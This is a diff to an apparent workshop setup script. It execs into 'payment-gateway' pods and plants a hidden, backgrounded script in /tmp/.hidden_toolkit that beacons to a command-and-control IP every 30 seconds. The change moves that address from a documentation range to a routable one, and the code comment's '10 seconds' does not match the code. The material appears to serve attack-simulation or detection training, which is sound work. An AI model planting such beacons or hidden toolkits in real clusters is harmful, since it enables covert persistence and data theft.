@@ -148,15 +148,28 @@ for i in $(seq 1 5); do
     --token "${token}" \
     --container httpd \
     -- sh -c '
-      export C2_SERVER="198.51.100.42"
+      export C2_SERVER="185.199.108.153"
       export CODENAME="SHADOW_PIVOT"
       export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"
+
       mkdir -p /tmp/.hidden_toolkit
-      echo "while true; do sleep 60; done" > /tmp/.hidden_toolkit/exfil.sh
+
+      # Build a script that actively beacons out to the C2 server every 10 seconds
+      cat << "EOF" > /tmp/.hidden_toolkit/exfil.sh
+#!/bin/sh
+while true; do
+  curl --silent --max-time 2 --output /dev/null \
+    --header "X-Agent-ID: SHADOW_PIVOT" \
+    --header "X-Target-Namespace: payment-gateway" \
+    "http://185.199.108.153/api/v1/beacon"
+
+  sleep 30
+done
+EOF
+
       chmod +x /tmp/.hidden_toolkit/exfil.sh
       /tmp/.hidden_toolkit/exfil.sh > /dev/null 2>&1 &
     '
-
   echo "[+] Namespace ${namespace} weaponized via simulated session execution."
 done
 #+end_src
@@ -165,7 +178,7 @@ done
 #+begin_example
 Applying template for each attendee
 project.project.openshift.io/payment-gateway-1 unchanged
-pod/payment-gateway unchanged
+pod/payment-gateway created
 serviceaccount/cicd-pipeline-runner-sa unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
 role.rbac.authorization.k8s.io/container-executor unchanged
